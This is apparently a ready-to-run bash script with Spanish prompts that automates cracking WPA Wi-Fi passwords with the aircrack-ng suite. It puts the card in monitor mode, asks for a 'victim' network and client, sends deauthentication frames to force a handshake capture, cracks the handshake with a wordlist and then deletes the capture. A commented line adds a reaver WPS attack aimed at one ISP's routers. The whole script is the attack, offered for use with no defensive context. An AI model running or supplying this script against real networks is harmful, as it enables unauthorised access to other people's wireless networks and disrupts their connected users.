#!/bin/bash
clear
echo "         _                   _       _                   _          _             _                   _               _          _       ";
echo "        / /\                /\ \    /\_\                /\ \       _\ \          / /\                / /\            /\ \       /\ \     ";
echo "       / /  \              /  \ \  / / /         _      \ \ \     /\__ \        / /  \              / /  \          /  \ \      \_\ \    ";
echo "      / / /\ \            / /\ \ \ \ \ \__      /\_\    /\ \_\   / /_ \_\      / / /\ \            / / /\ \        / /\ \ \     /\__ \   ";
echo "     / / /\ \ \          / / /\ \ \ \ \___\    / / /   / /\/_/  / / /\/_/     / / /\ \ \          / / /\ \ \      / / /\ \ \   / /_ \ \  ";
echo "    / / /  \ \ \        / / /  \ \_\ \__  /   / / /   / / /    / / /         / / /  \ \ \        / / /\ \_\ \    / / /  \ \_\ / / /\ \ \ ";
echo "   / / /___/ /\ \      / / / _ / / / / / /   / / /   / / /    / / /         / / /___/ /\ \      / / /\ \ \___\  / / /   / / // / /  \/_/ ";
echo "  / / /_____/ /\ \    / / / /\ \/ / / / /   / / /   / / /    / / / ____    / / /_____/ /\ \    / / /  \ \ \__/ / / /   / / // / /        ";
echo " / /_________/\ \ \  / / /__\ \ \/ / / /___/ / /___/ / /__  / /_/_/ ___/\ / /_________/\ \ \  / / /____\_\ \  / / /___/ / // / /         ";
echo "/ / /_       __\ \_\/ / /____\ \ \/ / /____\/ //\__\/_/___\/_______/\__\// / /_       __\ \_\/ / /__________\/ / /____\/ //_/ /          ";
echo "\_\___\     /____/_/\/________\_\/\/_________/ \/_________/\_______\/    \_\___\     /____/_/\/_____________/\/_________/ \_\/           ";
echo "                                                                                                                                         ";
sleep 3
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
xterm -maximized -hold -e "timeout 180 airodump-ng wlan0mon"&
echo Ingresa BSSID del objetivo
read -r bidvictima
echo Ingresa el Canal de la victima
read -r chnlvictima
xterm -maximized -hold -e "airodump-ng wlan0mon -w cap -c $chnlvictima --bssid $bidvictima"& sleep 10 &&
echo Ingresa BSSID del cliente en el objetivo
read -r client_aq ; xterm -maximized -hold -e "aireplay-ng --deauth 42 -a $bidvictima -c $client_aq wlan0mon"& sleep 10 &&
echo "----------------------------------------------------------------------------------------------------------------";
echo "1. Usar Default Wordlist.";
echo "2. Usar Complete WordList.";
read -r option_aq
if [ $option_aq == "1" ]; then
   wordlist="/usr/share/wordlists/DEAD-human.txt"
else
   wordlist="/usr/share/wordlists/DEAD.txt"
fi
aircrack-ng -w $wordlist -b $bidvictima ./*.cap
echo Deshabilitando modo monitor
airmon-ng stop wlan0mon
echo Borrando Handshake ...
rm cap*
echo enjoy! HF!

#reaver -i mon0 -b XX:XX:XX:XX:XX:XX -n -d 2 -T 2 - t 2 -vv       //WPS - MOVISTAR
#probar dumpper jumpster